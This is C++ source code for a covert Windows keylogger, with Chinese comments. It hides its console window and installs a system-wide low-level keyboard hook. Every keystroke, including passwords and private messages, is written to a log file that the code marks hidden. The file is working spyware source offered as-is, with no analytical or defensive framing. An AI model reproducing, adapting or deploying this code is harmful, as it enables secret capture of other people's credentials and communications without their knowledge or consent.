#define _WIN32_WINNT 0x0400                                                 // Windows NT 4.0
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") // 隐藏控制台窗口
#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
#include <stdlib.h>
using namespace std;

HHOOK g_hook = 0;
LPCWSTR log_name = TEXT("log.txt");

LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam)
{
    static bool capslock = false;
    static bool shift = false;
    if (code == HC_ACTION){
		char tmp[0xFF] = { 0 };
		string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *(KBDLLHOOKSTRUCT *)lparam;
		bool printable;

		// 获取键名
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameTextA(msg, tmp, 0xFF);
		str = string(tmp);
		printable = (str.length() <= 1) ? true : false;
		if(wparam == WM_SYSKEYDOWN || wparam == WM_KEYDOWN){
			/*
			 * 如果是不可打印字符：
			 * 换行符、空格、制表符将归为可打印字符
			 * 其余均以中括号封装封装('[' 和 ']')
			*/
			if (!printable)
			{
				// 改变状态的键名在这里处理
				if (str == "Caps Lock") {
					capslock = !capslock;
				}
				else if (str == "Shift") {
					shift = true;
				}

				// 其他转换为可打印字符的键名在这里处理
				if (str == "Enter"){
					str = "\n";
					printable = true;
				}
				else if (str == "Space"){
					str = " ";
					printable = true;
				}
				else if (str == "Tab"){
					str = "\t";
					printable = true;
				}
				else
				{
					str = ("[" + str + "]");
				}
			}

			/*
			 * 仅限可打印字符：
			 * 如果启用了shift并且大写已关闭或shift已关闭且大写已启用，将该字符设为大写。
			 * 如果两者都关闭或两者都打开，则字符为小写。
			 */
			if (printable){
				if (shift == capslock){
					for (size_t i = 0; i < str.length(); ++i)
						str[i] = tolower(str[i]);
				}
				else{
					for (size_t i = 0; i < str.length(); ++i){
						if (str[i] >= 'A' && str[i] <= 'Z')
							str[i] = toupper(str[i]);
					}
				}
			}

			ofstream of;
			of.open(log_name, ios::app);
			if (!of)
				exit(0);
			of << str;
			of.close();
		}else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
			if (!printable)
				if (str == "SHIFT")
					shift = false;
		}
	}
    ::SetFileAttributesW(log_name, FILE_ATTRIBUTE_HIDDEN); // 增加隐藏文件属性
    // 消息传递给下一个应用程序或钩子
    return CallNextHookEx(g_hook, code, wparam, lparam);
}

int main()
{
    MSG msg;

    // 装载钩子
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookproc, GetModuleHandle(NULL), 0);
    if (g_hook == NULL)
        exit(0);

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    };

    // 卸载钩子
    if (g_hook)
    {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
    return 0;
};